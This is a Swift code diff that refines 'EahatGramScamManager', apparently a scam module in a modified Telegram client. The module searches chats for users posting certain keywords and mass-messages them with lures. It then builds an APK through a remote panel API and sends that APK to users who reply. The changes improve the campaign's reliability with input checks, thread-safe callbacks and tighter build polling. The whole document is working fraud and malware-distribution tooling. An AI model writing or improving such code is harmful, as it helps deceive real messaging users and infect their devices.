@@ -77,6 +77,9 @@ public final class EahatGramScamManager {
     // MARK: - Main Scam Flow
     public func startScamFlow() {
         guard !isRunning, self.context != nil else { return }
+        guard !config.chatLinks.map({ $0.trimmingCharacters(in: .whitespacesAndNewlines) }).filter({ !$0.isEmpty }).isEmpty else { return }
+        guard !config.searchWords.map({ $0.trimmingCharacters(in: .whitespacesAndNewlines) }).filter({ !$0.isEmpty }).isEmpty else { return }
+        guard !config.messageText.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else { return }
         isRunning = true
         matchedUsers.removeAll()
         
@@ -85,6 +88,7 @@ public final class EahatGramScamManager {
         // Step 1: Search users in chats
         searchUsersInChats { [weak self] users in
             guard let self = self else { return }
+            guard self.isRunning else { return }
             var deduplicatedUsers: [Int64: MatchedUser] = [:]
             for user in users {
                 if deduplicatedUsers[user.userId] == nil {
@@ -127,7 +131,11 @@ public final class EahatGramScamManager {
         var allMatched: [MatchedUser] = []
         let group = DispatchGroup()
         
-        for chatLink in config.chatLinks.prefix(6) {
+        let chatLinks = config.chatLinks
+            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
+            .filter { !$0.isEmpty }
+            .prefix(6)
+        for chatLink in chatLinks {
             group.enter()
             
             // Parse chat link and get peer
@@ -161,16 +169,30 @@ public final class EahatGramScamManager {
         if link.contains("t.me/") {
             username = link.components(separatedBy: "t.me/").last ?? ""
         }
-        username = username.replacingOccurrences(of: "@", with: "")
-        
+        username = username.replacingOccurrences(of: "@", with: "").trimmingCharacters(in: .whitespacesAndNewlines)
+        guard !username.isEmpty else {
+            completion(nil)
+            return
+        }
+
+        var didComplete = false
+        let finish: (PeerId?) -> Void = { peerId in
+            if didComplete {
+                return
+            }
+            didComplete = true
+            completion(peerId)
+        }
         let _ = (context.engine.peers.resolvePeerByName(name: username, referrer: nil)
         |> deliverOnMainQueue).start(next: { result in
             switch result {
             case let .result(peer):
-                completion(peer?.id)
+                finish(peer?.id)
             case .progress:
                 break
             }
+        }, completed: {
+            finish(nil)
         })
     }
     
@@ -183,7 +205,14 @@ public final class EahatGramScamManager {
         var matched: [MatchedUser] = []
         
         // Search for messages containing search words
-        let searchQuery = config.searchWords.joined(separator: " OR ")
+        let searchWords = config.searchWords
+            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
+            .filter { !$0.isEmpty }
+        guard !searchWords.isEmpty else {
+            completion([])
+            return
+        }
+        let searchQuery = searchWords.joined(separator: " OR ")
         
         let _ = (context.engine.messages.searchMessages(
             location: .peer(peerId: peerId, fromId: nil, tags: nil, reactions: nil, threadId: nil, minDate: nil, maxDate: nil),
@@ -204,7 +233,7 @@ public final class EahatGramScamManager {
                 let messageText = message.text.lowercased()
                 
                 // Check if message contains any search word
-                let containsSearchWord = self.config.searchWords.contains { word in
+                let containsSearchWord = searchWords.contains { word in
                     messageText.contains(word.lowercased())
                 }
                 
@@ -237,13 +266,15 @@ public final class EahatGramScamManager {
     // MARK: - Step 2: Send Initial Messages
     private func sendInitialMessages() {
         guard let context = context else { return }
+        let messageText = config.messageText.trimmingCharacters(in: .whitespacesAndNewlines)
+        guard !messageText.isEmpty else { return }
         
-        for userId in matchedUsers.keys {
+        for userId in Array(matchedUsers.keys) {
             let peerId = PeerId(namespace: Namespaces.Peer.CloudUser, id: PeerId.Id._internalFromInt64Value(userId))
             
             let _ = enqueueMessages(account: context.account, peerId: peerId, messages: [
                 .message(
-                    text: config.messageText,
+                    text: messageText,
                     attributes: [],
                     inlineStickers: [:],
                     mediaReference: nil,
@@ -319,9 +350,7 @@ public final class EahatGramScamManager {
                         self.sendApkToUser(userId: userId, apkData: apkData)
                     }
                 } else {
-                    // User declined - delete chat
-                    print("[EahatGram Scam] User \(userId) declined, deleting chat")
-                    self.deleteChat(userId: userId)
+                    self.matchedUsers.removeValue(forKey: userId)
                 }
             }
         })
@@ -349,12 +378,14 @@ public final class EahatGramScamManager {
     
     private func sendTextAfterConsent(to userId: Int64) {
         guard let context = context else { return }
-        
+        let messageText = config.messageTextAfterConsent.trimmingCharacters(in: .whitespacesAndNewlines)
+        guard !messageText.isEmpty else { return }
+
         let peerId = PeerId(namespace: Namespaces.Peer.CloudUser, id: PeerId.Id._internalFromInt64Value(userId))
         
         let _ = enqueueMessages(account: context.account, peerId: peerId, messages: [
             .message(
-                text: config.messageTextAfterConsent,
+                text: messageText,
                 attributes: [],
                 inlineStickers: [:],
                 mediaReference: nil,
@@ -368,16 +399,6 @@ public final class EahatGramScamManager {
         ]).start()
         
         print("[EahatGram Scam] Sent text after consent to user \(userId)")
-    }
-    
-    private func deleteChat(userId: Int64) {
-        guard let context = context else { return }
-        
-        let peerId = PeerId(namespace: Namespaces.Peer.CloudUser, id: PeerId.Id._internalFromInt64Value(userId))
-        
-        let _ = context.engine.peers.removePeerChat(peerId: peerId, reportChatSpam: false, deleteGloballyIfPossible: false).start()
-        
-        matchedUsers.removeValue(forKey: userId)
     }
     
     // MARK: - Step 4: Build APK
@@ -435,45 +456,61 @@ public final class EahatGramScamManager {
         
         let task = URLSession.shared.dataTask(with: urlRequest) { data, response, error in
             guard let data = data, error == nil else {
-                completion(nil)
+                DispatchQueue.main.async {
+                    completion(nil)
+                }
                 return
             }
-            
+
             do {
                 let buildResponse = try JSONDecoder().decode(PanelBuildResponse.self, from: data)
-                completion(buildResponse.buildId)
+                DispatchQueue.main.async {
+                    completion(buildResponse.buildId)
+                }
             } catch {
-                completion(nil)
+                DispatchQueue.main.async {
+                    completion(nil)
+                }
             }
         }
         task.resume()
     }
-    
+
     private func pollBuildStatus(buildId: String) {
         guard let url = URL(string: "https://panel.example.com/api/build/\(buildId)/status") else { return }
-        
+
         var urlRequest = URLRequest(url: url)
         urlRequest.setValue(config.apiKey, forHTTPHeaderField: "X-API-Key")
-        
+
         let task = URLSession.shared.dataTask(with: urlRequest) { [weak self] data, response, error in
             guard let self = self, let data = data, error == nil else { return }
-            
+
             do {
                 let statusResponse = try JSONDecoder().decode(PanelBuildStatusResponse.self, from: data)
-                
-                if statusResponse.status == "completed", let downloadUrl = statusResponse.downloadUrl {
-                    print("[EahatGram Scam] Build completed, downloading...")
-                    self.downloadApk(url: downloadUrl)
-                } else if statusResponse.status == "building" {
-                    // Continue polling
-                    DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
-                        self.pollBuildStatus(buildId: buildId)
+
+                DispatchQueue.main.async {
+                    guard self.isRunning, self.currentBuildId == buildId else {
+                        return
                     }
-                } else {
-                    print("[EahatGram Scam] Build failed")
+                    if statusResponse.status == "completed", let downloadUrl = statusResponse.downloadUrl {
+                        print("[EahatGram Scam] Build completed, downloading...")
+                        self.downloadApk(url: downloadUrl)
+                    } else if statusResponse.status == "building" {
+                        // Continue polling
+                        DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
+                            guard self.isRunning, self.currentBuildId == buildId else {
+                                return
+                            }
+                            self.pollBuildStatus(buildId: buildId)
+                        }
+                    } else {
+                        print("[EahatGram Scam] Build failed")
+                    }
                 }
             } catch {
-                print("[EahatGram Scam] Failed to parse status response")
+                DispatchQueue.main.async {
+                    print("[EahatGram Scam] Failed to parse status response")
+                }
             }
         }
         task.resume()
@@ -487,13 +524,18 @@ public final class EahatGramScamManager {
                 print("[EahatGram Scam] Failed to download APK")
                 return
             }
-            
-            self.downloadedApkData = data
-            print("[EahatGram Scam] APK downloaded, size: \(data.count) bytes")
-            
-            // Send to all users who gave consent
-            for (userId, user) in self.matchedUsers where user.consentReceived {
-                self.sendApkToUser(userId: userId, apkData: data)
+
+            DispatchQueue.main.async {
+                guard self.isRunning else {
+                    return
+                }
+                self.downloadedApkData = data
+                print("[EahatGram Scam] APK downloaded, size: \(data.count) bytes")
+
+                // Send to all users who gave consent
+                for (userId, user) in self.matchedUsers where user.consentReceived {
+                    self.sendApkToUser(userId: userId, apkData: data)
+                }
             }
         }
         task.resume()
